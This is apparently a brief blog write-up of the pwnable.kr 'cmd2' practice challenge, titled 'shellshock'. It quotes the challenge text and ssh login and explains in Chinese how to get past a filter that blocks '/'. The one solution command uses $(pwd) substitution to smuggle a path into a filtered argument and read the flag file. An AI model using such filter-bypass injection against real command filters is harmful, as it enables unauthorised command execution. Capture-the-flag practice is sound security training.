---
layout:     post
title:      pwnable shellshock
author:     wooy0ung
tags: 		pwn
category:  	writeup
---


>Problem Address:  
>http://pwnable.kr/  
>  
>Problem Description:  
>Daddy bought me a system command shell.  
>but he put some filters to prevent me from playing with it without his permission...  
>but I wanna play anytime I want!  
>Address:  
>ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)  
<!-- more -->


### 0x00 exploit

相比 cmd1, 还过滤了 '/' 字符, 利用 pwd 绕过

```
$ /home/cmd2/cmd2 '""$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f*""'
```

getflag~

![](/assets/img/writeup/pwn/2017-08-27-pwnable-cmd2/0x00.png)